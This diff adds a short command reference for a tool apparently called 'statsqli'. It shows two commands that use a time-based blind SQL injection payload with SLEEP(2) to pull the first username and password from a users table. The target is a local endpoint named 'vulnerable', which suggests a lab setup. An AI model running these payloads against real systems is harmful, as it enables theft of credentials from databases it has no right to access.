@@ -1,0 +1,8 @@
+# Quick Command Reference
+
+# Extract first username (simplest)
+statsqli "http://127.0.0.1:5000/vulnerable?id=1" --payload "1 OR ({condition}) AND SLEEP(2) -- -" --table users --column username --where "1=1 LIMIT 0,1" --parallel
+
+# Extract first password
+statsqli "http://127.0.0.1:5000/vulnerable?id=1" --payload "1 OR ({condition}) AND SLEEP(2) -- -" --table users --column password --where "1=1 LIMIT 0,1" --parallel
+
